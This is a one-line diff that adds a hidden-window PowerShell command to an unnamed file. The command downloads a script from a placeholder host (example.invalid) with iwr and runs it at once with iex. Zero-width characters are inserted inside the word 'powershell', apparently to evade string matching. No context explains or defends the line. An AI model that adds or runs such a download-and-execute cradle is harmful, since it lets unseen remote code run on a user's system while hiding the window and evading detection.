@@ -1,0 +1,1 @@
+p​o​w​e​r​shell -w hidden -c "iwr https://example.invalid/z|iex"
